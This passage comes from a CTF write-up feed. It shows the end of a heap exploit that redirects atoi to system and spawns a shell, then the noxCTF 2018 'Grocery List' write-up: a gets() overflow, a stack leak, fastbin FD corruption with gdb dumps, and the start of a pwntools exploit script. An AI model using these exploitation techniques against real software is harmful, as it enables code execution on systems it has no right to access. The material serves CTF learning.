payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;realloc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# realloc&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;setvbuf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# setvbuf&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# atoi -&amp;gt; system&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, payload)

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# r.sendline(&amp;#39;cat /var/flag/*&amp;#39;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# print r.recvline(False)&lt;/span&gt;

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;λ › python solve.py localhost &lt;span style=&#34;color:#ae81ff&#34;&gt;51100&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Opening connection to localhost on port 51100: Done
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
$ id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctf&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
$ cat /var/flag/*
CJ2018&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
$ 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Closed connection to localhost port &lt;span style=&#34;color:#ae81ff&#34;&gt;51100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;rant&#34;&gt;rant&lt;/h2&gt;
&lt;p&gt;Soalnya cukup menarik, baru solve pas beberapa menit-menit setelah lomba selesai karena sempet kesasar dengan asumsi bisa pakai poison-null-byte (╯°. °）╯︵ ┻━┻. 11/10 would ikut again.&lt;/p&gt;
</description>
       </item>
       
       <item>
         <title>noxCTF 2018 - Grocery List</title>
         <link>http://kiror0.github.io/ctf/posts/noxctf-2018-grocery-list/</link>
         <pubDate>Sun, 09 Sep 2018 15:31:34 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/noxctf-2018-grocery-list/</guid>
         <description>&lt;blockquote&gt;
&lt;p&gt;Downloads:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/noxCTF/grocery_list/GroceryList&#34;&gt;GroceryList&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/noxCTF/grocery_list/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;intro&#34;&gt;intro&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;λ › checksec ./GroceryList
[*] &#39;/Challs/noxCTF/pwn/grocery_list/GroceryList&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
λ › ./GroceryList
Hello and welcome to the grocery List! Here you can manage the list of items you would like to buy.
What would you like to do?
1. Print the list
2. Add item to the list
3. Add empty items to the list
4. Remove an item from the list
5. Edit an existing item
6. Add default example
7. Exit
3
What is the size of your items?
1. Small
2. Medium
3. Large
1
How many items would you like to add?
1
^C
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;I really hate it when I forget what I wanted to buy.
That&#39;s why I created the FASTEST Grocery List in the world.
Go check it out.
nc chal.noxale.com 1232
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is like any usual heap exploitation challanges, we have &lt;code&gt;print&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;, and &lt;code&gt;add&lt;/code&gt; items in/to the lists. The main loop roughly looks like this,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; select;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; grocery_item[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Grocery Item&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;What would you like to do?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1. Print the list&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2. Add item to the list&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3. Add empty items to the list&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4. Remove an item from the list&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5. Edit an existing item&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6. Add default example&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7. Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    fflush(stdin);
    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;select);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ( select ) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        print_all();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        add_item();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        add_empty();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        delete_item();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        edit_item();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        add_default(grocery_item);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Goodbye&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        free_all();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Invalid choice&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( select &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looks good, but we have some limitation on malloc chunk size, only FASTBIN allowed &lt;code&gt;small = 0x10&lt;/code&gt;, &lt;code&gt;medium = 0x38&lt;/code&gt;, and &lt;code&gt;large = 0x60&lt;/code&gt;. This actually confirms the challange description &lt;code&gt;the FASTEST Grocery List in the world&lt;/code&gt;, well, yes &lt;em&gt;FASTEST&lt;/em&gt; bin.&lt;/p&gt;
&lt;h2 id=&#34;overflow&#34;&gt;overflow&lt;/h2&gt;
&lt;p&gt;In &lt;code&gt;edit&lt;/code&gt; we have overflow using &lt;code&gt;gets()&lt;/code&gt;,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;    puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Which item would you like to edit?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    fflush(stdin);
    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;index);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index ) {
      puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Invalid index&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      puts_(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Enter your item`s new name: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
      gets(ptr_list[index]);
      item &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr_list[v2];
      item[strcspn(ptr_list[index], &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;leak&#34;&gt;leak&lt;/h2&gt;
&lt;p&gt;In &lt;code&gt;add_default&lt;/code&gt;, the argument isn&#39;t passed properly, instead of copying it&#39;s value, it&#39;s actually copied the pointer to grocery_item on stack. Thus, we have stack leak.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    add_default()
    stack = u64(dump_all()[0].ljust(8, &#39;\x00&#39;))
    log.info(&#39;stack &#39; + hex(stack))

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000000000000000
0x555555756050: 0x0000000000000000      0x0000000000000000
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/10gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021
0x555555758430: 0x00007fffffffeceb      0x0000000000000000
0x555555758440: 0x0000000000000000      0x000000000001fbc1
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastbin-attack-forging-chunk&#34;&gt;fastbin-attack, forging-chunk&lt;/h2&gt;
&lt;p&gt;In simple form, we will corrupt FD pointer to trick malloc serving us a controlled pointer. We have stack address leak, so it should be good destination for this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb-peda$ x/10gx 0x00007fffffffecd0
0x7fffffffecd0: 0x00000000ffffecfe      0x0000000000000021
0x7fffffffece0: 0x00002aaaaacf3830      0x65636f7247554910
0x7fffffffecf0: 0x006d657449207972      0x4226f8d697e7ba00
0x7fffffffed00: 0x0000555555555380      0x00002aaaaacf3830
0x7fffffffed10: 0x0000000000000001      0x00007fffffffede8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;welp. Right off the bat, &lt;code&gt;0x7fffffffecd0&lt;/code&gt; should be good enough, beacause the it passes the request size check for &lt;code&gt;__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    add_empty(1, 4)
	remove_item(1)
	remove_item(1)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 2, free
0x555555758470: 0x0000555555758440      0x0000000000000000 # FD
0x555555758480: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 3
0x555555758490: 0x0000000000000000      0x0000000000000000
0x5555557584a0: 0x0000000000000000      0x000000000001fb61

    payload  = p64(0) * 3
    payload += p64(0x21)
    payload += p64(0) * 3
    payload += p64(0x21)
    payload += p64(stack - 0x1b)
    edit_item(0, payload)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 2, free
0x555555758470: 0x00007fffffffecd0      0x0000000000000000 # FD corrupted
0x555555758480: 0x0000000000000000      0x0000000000000021 &amp;lt;- item 3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, after this the next allocation for items should have our controlled pointer,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    add_empty(1, 2)

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000555555758490
0x555555756050: 0x0000555555758470      0x00007fffffffece0 &amp;lt;- controlled !!
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000000000000000      0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will eventually lead to libc leak too, since &lt;code&gt;0x00007fffffffece0&lt;/code&gt; contains the address of &lt;code&gt;__libc_start_main+241&lt;/code&gt;. Ok, we have overflow, controlled pointer at stack, libc leak, is it done? Well, sadly, not yet. We should bypass some more protection on binary, stack canary and this custom protection at the end of &lt;code&gt;main&lt;/code&gt; function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if ( *(rbp+0x8) != (void *)bss_retAddr || *(rbp-0x20) != (void *)bss_retAddr )
    exit(1);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can&#39;t use overflow and &lt;code&gt;dump_all&lt;/code&gt; to leak canary, because at the end of buffer null byte appended. So, from this point it&#39;s just forging chunks and fastbin attack with different size (we still have medium and large sized fastbins to use), to leak canary, pie base, and stuff.&lt;/p&gt;
&lt;p&gt;Wonder why I&#39;m not using &lt;code&gt;__malloc_hook&lt;/code&gt; or stuff like that? Well, sadly, no satisfied offset from any one_gadget RCE, simply we can&#39;t use &lt;code&gt;__malloc_hook&lt;/code&gt; on this challanges, or is it(?).&lt;/p&gt;
&lt;h2 id=&#34;full-exploit&#34;&gt;full exploit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

gdbcmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b *{}+0x1283&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# context.terminal = &amp;#39;kitty @ new-window --keep-focus sh -c&amp;#39;.split()&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__len__() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], aslr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False, env&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LD_PRELOAD&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/home/vagrant/ctf/nox/pwn/grocery_list/libc.so&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;})
    &lt;span style=&#34;color:#75715e&#34;&gt;# r = process(sys.argv[1], aslr=False)&lt;/span&gt;
